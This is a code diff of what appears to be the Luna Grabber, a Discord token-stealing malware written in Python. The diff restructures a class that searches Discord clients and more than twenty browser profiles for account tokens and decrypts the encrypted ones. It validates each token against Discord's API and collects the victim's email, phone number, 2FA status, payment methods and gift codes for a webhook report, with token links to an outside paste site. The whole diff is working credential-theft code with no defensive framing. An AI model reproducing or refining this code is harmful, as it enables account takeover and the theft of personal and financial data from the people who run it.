@@ -29,9 +29,6 @@ webhook = "%webhook_here%"
 ping = "%ping_enabled%"
 pingType = "%ping_type%"
 
-dummy_message = "Loading..." # change if you want
-print(dummy_message)
-
 def main(webhook):
     global embed
 
@@ -86,7 +83,6 @@ def try_extract(func):
         return wrapper
 
 def get_inf():
-    global ip_address, mac_address, hwid, pc_username, pc_name, computer_os, cpu, gpu, ram
 
     ip_address = requests.get('http://ipinfo.io/json').json()['ip']
     mac_address = ':'.join(findall('..', '%012x' % uuid.getnode()))
@@ -109,23 +105,13 @@ def get_inf():
 @try_extract
 class grabtokens():
     def __init__(self):
-        global username
-
         self.baseurl = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
-        self.tempfolder = os.getenv("temp")+"\\Luna_Grabber"
         self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
         self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]*"
 
-        try:
-            os.mkdir(os.path.join(self.tempfolder))
-        except Exception:
-            pass
-
         self.tokens = []
-        self.discord_psw = []
-        self.backup_codes = []
 
         self.grabTokens()
 
@@ -160,124 +146,131 @@ class grabtokens():
             return "Failed to decrypt password"
 
     def grabTokens(self):
-        global token, tokens
+        try: 
+            paths = {
+                'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
+                'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
+                'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
+                'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
+                'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
+                'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
+                'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
+                'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
+                'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
+                'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
+                'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
+                '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
+                'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
+                'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
+                'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
+                'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
+                'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
+                'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
+                'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
+                'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
+                'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
+                'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
+                'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
+                'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
+                'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
+                'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
+                'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
+            }
 
-        paths = {
-            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
-            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
-            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
-            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
-            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
-            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
-            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
-            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
-            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
-            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
-            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
-            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
-            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
-            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
-            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
-            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
-            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
-            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
-            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
-            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
-            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
-            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
-        }
-
-        for _, path in paths.items():
-            if not os.path.exists(path):
-                continue
-            if "discord" not in path:
-                for file_name in os.listdir(path):
-                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-                        continue
-                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                        for regex in self.regex:
-                            for token in findall(regex, line):
-                                try:
-                                    r = requests.get(
-                                        self.baseurl, headers=self.getheaders(token))
-                                except Exception:
-                                    pass
-                                if r.status_code == 200 and token not in self.tokens:
-                                    self.tokens.append(token)
-            elif os.path.exists(self.roaming + '\\discord\\Local State'):
-                for file_name in os.listdir(path):
-                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-                        continue
-                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                        for y in findall(self.encrypted_regex, line):
-                            token = None
-                            token = self.decrypt_password(b64decode(y[:y.find('"')].split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State'))
-                            r = requests.get(self.baseurl, headers=self.getheaders(token))
-                            if r.status_code == 200 and token not in self.tokens: 
-                                self.tokens.append(token)
-
-        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
-            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
-                for _file in files:
-                    if not _file.endswith('.sqlite'):
-                        continue
-                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
-                        for regex in (self.regex):
-                            for token in findall(regex, line):
-                                try:
-                                    r = requests.get(self.baseurl, headers=self.getheaders(token))
-                                except Exception:
-                                    pass
-                                if r.status_code == 200 and token not in self.tokens:
+            for _, path in paths.items():
+                if not os.path.exists(path):
+                    continue
+                if "discord" not in path:
+                    for file_name in os.listdir(path):
+                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                            continue
+                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                            for regex in self.regex:
+                                for token in findall(regex, line):
+                                    try:
+                                        r = requests.get(
+                                            self.baseurl, headers=self.getheaders(token))
+                                    except Exception:
+                                        pass
+                                    if r.status_code == 200 and token not in self.tokens:
+                                        self.tokens.append(token)
+                elif os.path.exists(self.roaming + '\\discord\\Local State'):
+                    for file_name in os.listdir(path):
+                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                            continue
+                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                            for y in findall(self.encrypted_regex, line):
+                                token = None
+                                token = self.decrypt_password(b64decode(y[:y.find('"')].split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State'))
+                                r = requests.get(self.baseurl, headers=self.getheaders(token))
+                                if r.status_code == 200 and token not in self.tokens: 
                                     self.tokens.append(token)
 
-        for token in self.tokens:
-            r = requests.get(
-                'https://discord.com/api/v9/users/@me',
-                headers={"Authorization": token})
+            if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
+                for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
+                    for _file in files:
+                        if not _file.endswith('.sqlite'):
+                            continue
+                        for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
+                            for regex in (self.regex):
+                                for token in findall(regex, line):
+                                    try:
+                                        r = requests.get(self.baseurl, headers=self.getheaders(token))
+                                    except Exception:
+                                        pass
+                                    if r.status_code == 200 and token not in self.tokens:
+                                        self.tokens.append(token)
 
-            discord_id = r.json()['id']
-            username = r.json()['username'] + '#' + r.json()['discriminator']
-            phone = r.json()['phone']
-            email = r.json()['email']
+            for token in self.tokens:
+                r = requests.get(
+                    'https://discord.com/api/v9/users/@me',
+                    headers={"Authorization": token})
 
-            if r.json()['mfa_enabled'] == True:
-                mfa = "✅"
-            if r.json()['mfa_enabled'] == False:
-                mfa = "❌"
+                discord_id = r.json()['id']
+                username = r.json()['username'] + '#' + r.json()['discriminator']
+                phone = r.json()['phone']
+                email = r.json()['email']
 
-            if r.json()['premium_type'] == 1:
-                nitro = 'Nitro Classic'
-            elif r.json()['premium_type'] == 2:
-                nitro = 'Nitro Boost'
+                try:
+                    if r.json()['mfa_enabled'] == True:
+                        mfa = "✅"
+                    if r.json()['mfa_enabled'] == False:
+                        mfa = "❌"
+                except Exception:
+                    mfa = "❌"
 
-            b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token))
+                try:
+                    if r.json()['premium_type'] == 1:
+                        nitro = 'Nitro Classic'
+                    elif r.json()['premium_type'] == 2:
+                        nitro = 'Nitro Boost'
+                except:
+                    nitro = 'None'
 
-            if b.json() == []:
-                methods = "None"
-            else:
-                methods = ""
-                for method in b.json():
-                    if method['type'] == 1:
-                        methods += "💳"
-                    elif method['type'] == 0:
-                        methods += "<:paypal:973417655627288666>"
-                    else:
-                        methods += "❓"
+                b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token))
 
-            g = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=self.getheaders(token))
-            if "code" in g.text:
-                codes = json.loads(g.text)
-                for code in codes:
-                    all_codes = code['code']
-                    title = code['promotion']['outbound_title']
+                if b.json() == []:
+                    methods = "None"
+                else:
+                    methods = ""
+                    for method in b.json():
+                        if method['type'] == 1:
+                            methods += "💳"
+                        elif method['type'] == 0:
+                            methods += "<:paypal:973417655627288666>"
+                        else:
+                            methods += "❓"
+
+                g = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=self.getheaders(token))
+                if "code" in g.text:
+                    codes = json.loads(g.text)
+                    for code in codes:
+                        all_codes = code['code']
+                        gift_title = code['promotion']['outbound_title']
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           #addidix's cool little copy n paste website
-            embed.add_field(name=f"DISCORD INFO - {username}", value=f'''<:1119pepesneakyevil:972703371221954630> `Discord ID:` **{discord_id}** \n<:gmail:996083031632773181> `Email:` **{email}**\n<:mobilephone:996101721879224331> `Phone:` **{phone}**\n\n<:2fa:996102455744012428> `2FA:` **{mfa}**\n<a:nitroboost:996004213354139658> `Nitro:` **{nitro}**\n<:billing:996099943574012024> `Billing:` **{methods}**\n\n<:pepehappy:996100452112400526> `Token:` **{token}**\n[Click to copy!](https://paste.addi00000.repl.co/?p={token})\n\u200b\n:gift: `{title}:`\n**{all_codes}**\n[Click to copy!](https://paste.addi00000.repl.co/?p={all_codes})\u200b''', inline=False)
+            embed.add_field(name=f"DISCORD INFO - {username}", value=f'''<:1119pepesneakyevil:972703371221954630> `Discord ID:` **{discord_id}** \n<:gmail:996083031632773181> `Email:` **{email}**\n<:mobilephone:996101721879224331> `Phone:` **{phone}**\n\n<:2fa:996102455744012428> `2FA:` **{mfa}**\n<a:nitroboost:996004213354139658> `Nitro:` **{nitro}**\n<:billing:996099943574012024> `Billing:` **{methods}**\n\n<:pepehappy:996100452112400526> `Token:` **{token}**\n[Click to copy!](https://paste.addi00000.repl.co/?p={token})\n\u200b\n:gift: `{gift_title}:`\n**{all_codes}**\n[Click to copy!](https://paste.addi00000.repl.co/?p={all_codes})\u200b''', inline=False)
+        except Exception as e:
+            print(e)    
 
 def ss():
     ImageGrab.grab(
